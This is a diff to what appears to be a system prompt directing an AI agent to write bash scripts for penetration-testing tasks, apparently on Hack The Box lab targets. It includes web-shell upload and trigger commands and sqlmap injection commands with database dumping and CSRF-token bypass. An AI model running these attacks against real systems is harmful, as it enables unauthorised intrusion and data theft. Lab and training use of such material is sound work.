@@ -13,6 +13,10 @@ ALL steps must be in ONE script -- variables do not persist between separate cal
 Always start with:
     export PATH="$HOME/.local/bin:$PATH"
 
+If your task uses a hostname (e.g. app.htb, admin.app.htb), ensure it resolves first:
+    grep -q "HOSTNAME" /etc/hosts || echo "TARGET_IP HOSTNAME" | sudo tee -a /etc/hosts > /dev/null
+Replace TARGET_IP and HOSTNAME with the actual values from the task.
+
 --- SESSION (any task involving login or cookies) ---
     COOK=/tmp/plante_session.txt
     curl -s -c $COOK -b $COOK <url>    # first request: saves + sends cookies
@@ -51,8 +55,16 @@ Then upload and trigger:
     curl -s "http://target/uploads/shell.php?cmd=id"
 
 --- SQL INJECTION ---
-    sqlmap -u http://target/login --forms --batch --technique=B --level=2 | cat
-    sqlmap -u http://target/login --data "user=x&pass=x" --batch --technique=B | cat
+Target a specific known endpoint and parameter — do NOT use --forms (too slow, scans the whole app):
+    sqlmap -u "http://target/endpoint" --data "email=x&submit=1" -p email --batch --technique=B --level=2 | cat
+    sqlmap -u "http://target/endpoint?id=1" -p id --batch --technique=B --dump | cat
+
+If the form has a CSRF token (Laravel _token, Django csrfmiddlewaretoken, etc.) sqlmap must
+refresh it automatically — otherwise every request gets a 419/403:
+    sqlmap -u "http://target/endpoint" --data "email=x&_token=x" -p email \
+           --csrf-token=_token --csrf-url="http://target/the-form-page" \
+           --batch --technique=B --level=2 | cat
+Replace _token and the form page URL with the actual token field name and the page that serves the form.
 
 --- SUCCESS DETECTION ---
 Check HTTP code after a login POST:
@@ -63,10 +75,11 @@ Some apps return 200 with a session cookie -- follow up by fetching a protected 
 
 --- NEVER ---
 - NEVER use set -e (grep returns exit 1 on no match, which kills the script)
-- NEVER use grep -P or grep -oP (Perl mode silently fails on Kali)
-- NEVER use Python for HTML parsing (heredocs break on remote execution)
+- NEVER use grep -P or grep -oP (Perl regex mode is unreliable on Kali)
+- NEVER use Python with multi-line heredocs (they break on remote execution); python3 one-liners with -c are fine
 - NEVER redirect output to files (no > file.txt) -- stdout only
-- NEVER print full HTML -- store in variable, grep only what matters
+- For account/profile/IDOR pages: print the FULL response body so all fields are visible
+- For large pages (homepage, CSS): store in variable and grep only what matters
 - Always pipe interactive tools through | cat:  sqlmap ... | cat  /  hydra ... | cat
 
 Output ONLY the bash script. No explanation, no markdown fences.
